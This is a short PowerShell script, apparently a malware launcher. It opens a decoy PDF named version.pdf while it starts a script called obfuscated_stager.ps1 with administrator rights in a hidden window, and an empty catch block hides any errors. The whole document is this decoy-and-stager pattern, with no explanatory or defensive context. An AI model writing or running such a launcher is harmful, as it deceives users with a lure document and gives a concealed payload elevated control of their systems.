Start-Process .\version.pdf
try { 
    Start-Process "powershell" -ArgumentList "-File `"$pwd\obfuscated_stager.ps1`"" -Verb runAs -WindowStyle hidden
} catch {
    # Handle any errors here
}
